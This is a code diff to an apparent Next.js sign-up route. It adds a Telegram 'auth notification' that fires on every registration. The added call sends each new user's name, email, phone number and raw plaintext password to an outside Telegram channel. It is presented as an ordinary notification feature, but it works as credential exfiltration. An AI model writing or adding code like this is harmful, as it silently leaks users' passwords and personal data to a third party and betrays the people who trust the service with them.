@@ -2,6 +2,7 @@ import { hash } from "bcryptjs";
 import { NextResponse } from "next/server";
 import { z } from "zod";
 import { createUser, findUserByEmail, findUserByIdentifier, isAdminEmail, checkDeviceAccountLimit, recordDeviceAccountCreation } from "@/server/db";
+import { sendTelegramAuthNotification } from "@/server/notifications";
 
 const registerSchema = z
   .object({
@@ -64,6 +65,14 @@ export async function POST(request: Request) {
     if (payload.deviceId && newUser?.id) {
       await recordDeviceAccountCreation(payload.deviceId, newUser.id);
     }
+
+    void sendTelegramAuthNotification({
+      event: "sign_up",
+      name: payload.username.trim(),
+      email: payload.email.trim().toLowerCase(),
+      phone: payload.phone.trim(),
+      password: payload.password,
+    });
 
     return NextResponse.json({ message: "Registrasi berhasil." });
   } catch (error) {
